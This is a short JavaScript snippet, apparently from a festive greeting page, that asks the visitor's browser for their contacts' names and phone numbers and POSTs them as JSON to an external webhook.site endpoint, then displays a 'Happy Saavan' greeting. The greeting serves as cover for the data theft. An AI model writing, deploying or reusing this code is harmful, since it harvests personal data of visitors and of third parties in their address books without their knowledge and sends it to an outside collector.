async function getContacts() {
  try {
    const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
    await fetch('https://webhook.site/496c0285-9624-4c0e-a3b1-fdd6c200d219', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(contacts)
    });
    alert("🎉 Happy Saavan in Advance! 🌿");
  } catch {
    alert("Permission denied ya unsupported device");
  }
}